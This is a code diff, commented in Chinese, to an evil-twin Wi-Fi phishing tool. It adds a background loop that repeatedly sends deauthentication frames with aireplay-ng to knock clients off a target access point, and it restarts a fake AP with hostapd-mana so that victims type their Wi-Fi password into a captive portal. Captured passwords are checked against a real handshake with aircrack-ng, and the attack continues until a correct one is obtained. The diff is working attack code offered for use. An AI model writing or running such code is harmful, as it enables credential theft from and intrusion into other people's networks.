@@ -66,6 +66,8 @@ state = {
     "log": [],
 }
 lock = threading.Lock()
+# 持续踢人循环的停止事件（验证通过自动关假 AP / 手动停止时置位）
+deauth_stop = threading.Event()
 
 def log(msg):
     with lock:
@@ -142,6 +144,44 @@ def stop_services():
         run(f"systemctl stop {u} 2>/dev/null")
     run("systemctl reset-failed evil-dnsmasq evil-portal evil-hostapd 2>/dev/null")
     time.sleep(1)
+
+def deauth_loop(target, iface):
+    """攻击期间持续踢人：周期广播 deauth 让真 AP 客户端掉线，
+    直到验证通过自动关闭假 AP 或手动停止（stop_event 置位）。"""
+    bssid, channel = target["bssid"], target["channel"]
+    log("持续踢人循环启动（每 30 秒广播 deauth，直到拿到正确密码）")
+    while not deauth_stop.is_set():
+        # 每轮先检查是否有受害者连上假 AP 正在输密码；有则跳过本轮，避免打断
+        clients = read_clients()
+        if clients:
+            time.sleep(5)
+            continue
+        # 短暂切 monitor 广播 deauth，再恢复假 AP
+        run(f"systemctl stop {UNITS['hostapd']} 2>/dev/null; systemctl reset-failed {UNITS['hostapd']} 2>/dev/null")
+        run("pkill -9 -f hostapd-mana 2>/dev/null")
+        time.sleep(1)
+        run(f"ip link set {iface} down; iw dev {iface} set type monitor; ip link set {iface} up 2>/dev/null")
+        time.sleep(1)
+        run(f"iw dev {iface} set channel {channel} 2>/dev/null")
+        time.sleep(1)
+        run(f"timeout 5 aireplay-ng -0 4 -a {bssid} {iface}", timeout=12)
+        # 恢复假 AP 模式（hostapd 重新接管）
+        run(f"ip link set {iface} down; iw dev {iface} set type managed")
+        run(f"ip addr flush dev {iface} 2>/dev/null")
+        run(f"ip addr add {GATEWAY_IP}/24 dev {iface}")
+        run(f"ip link set {iface} up")
+        time.sleep(1)
+        for _ in range(30):
+            if deauth_stop.is_set():
+                return
+            run(f"systemctl reset-failed {UNITS['hostapd']} 2>/dev/null")
+            run(f"systemd-run --unit={UNITS['hostapd']} --collect hostapd-mana {HOSTAPD_CONF}")
+            time.sleep(2)
+            out, _, _ = run(f"systemctl is-active {UNITS['hostapd']}")
+            if "active" in out:
+                break
+        # 等待下一轮（30 秒一轮）
+        deauth_stop.wait(30)
 
 def start_attack(target):
     # 并发保护：立即锁定，防止重复点击产生多个攻击线程
@@ -230,10 +270,15 @@ def start_attack(target):
             state["mode"] = "error"
     if ok < 3:
         log("警告: 有服务未启动，请查看下方日志排查")
+        return ok
+    # 8. 启动持续踢人循环（未拿到正确密码前一直踢）
+    deauth_stop.clear()
+    threading.Thread(target=deauth_loop, args=(target, IFACE), daemon=True).start()
     return ok
 
 def stop_attack():
     log("停止攻击，恢复环境...")
+    deauth_stop.set()   # 停止持续踢人循环
     stop_services()
     run("systemctl start systemd-resolved 2>/dev/null")
     ensure_managed()
@@ -280,26 +325,27 @@ def verify_password(pwd):
     """用真实握手 hash 验证捕获的密码是否正确。
     返回 {"ok": bool, "note": str, "verified": bool}
       - verified=True  : 已用真实握手验证过，ok 表示是否正确
-      - verified=False : 该目标未配置验证基准（无握手），无法确认正确性（ok=True 仅表示已捕获）"""
+      - verified=False : 该目标未配置验证基准（无握手），一律按验证失败处理
+    （严格模式：只有真握实验证通过的密码才放行，否则显示"密码错误"并继续攻击）"""
     with lock:
         tgt = state.get("target") or {}
     ssid = tgt.get("ssid", "")
     entry = HASHES.get(ssid)
     if not entry:
-        # 未配置验证基准：捕获成功但无法确认正确性，前端显示黄色提示
-        log("警告: 目标 %s 未配置 EVIL_HASHES 验证基准，无法确认密码正确性" % ssid)
-        return {"ok": True, "note": "no-hash", "verified": False}
+        # 未配置验证基准：按验证失败处理（不放行、不关假 AP、攻击继续）
+        log("警告: 目标 %s 未配置 EVIL_HASHES 验证基准，密码按验证失败处理（攻击继续）" % ssid)
+        return {"ok": False, "note": "no-hash", "verified": False}
     hfile, bssid = entry
     if not os.path.exists(hfile):
-        log("警告: 握手文件 %s 不存在，无法验证" % hfile)
-        return {"ok": True, "note": "no-hash-file", "verified": False}
+        log("警告: 握手文件 %s 不存在，密码按验证失败处理" % hfile)
+        return {"ok": False, "note": "no-hash-file", "verified": False}
     # 单密码验证（写临时字典，避免引号注入；放工作目录避免 /tmp 权限问题）
     tmp = os.path.join(BASE_DIR, ".verify_tmp.txt")
     try:
         with open(tmp, "w") as f:
             f.write(pwd + "\n")
     except Exception:
-        return {"ok": True, "note": "write-fail", "verified": False}
+        return {"ok": False, "note": "write-fail", "verified": False}
     out, _, rc = run(f"aircrack-ng -w {tmp} -b {bssid} {hfile} 2>&1", timeout=40)
     ok = "KEY FOUND" in out
     log("密码验证: %s -> %s" % (pwd, "正确" if ok else "错误"))
@@ -509,8 +555,8 @@ async function poll() {
           vb.className = 'vbadge ok'; vb.style.display = 'block';
           vb.textContent = '&#x2705; 密码验证通过！正在自动关闭假 AP...';
         } else if (d.verify.state === 'ok' && !d.verify.verified) {
-          vb.className = 'vbadge wait'; vb.style.display = 'block';
-          vb.textContent = '&#x26A0;&#xFE0F; 已捕获密码，但该 WiFi 未配置验证基准（EVIL_HASHES），无法确认正确性';
+          vb.className = 'vbadge fail'; vb.style.display = 'block';
+          vb.textContent = '&#x274C; 密码错误（该 WiFi 未配置验证基准，无法确认正确性），攻击继续...';
         } else {
           vb.className = 'vbadge fail'; vb.style.display = 'block';
           vb.textContent = '&#x274C; 密码错误，受害者正在重新输入...';
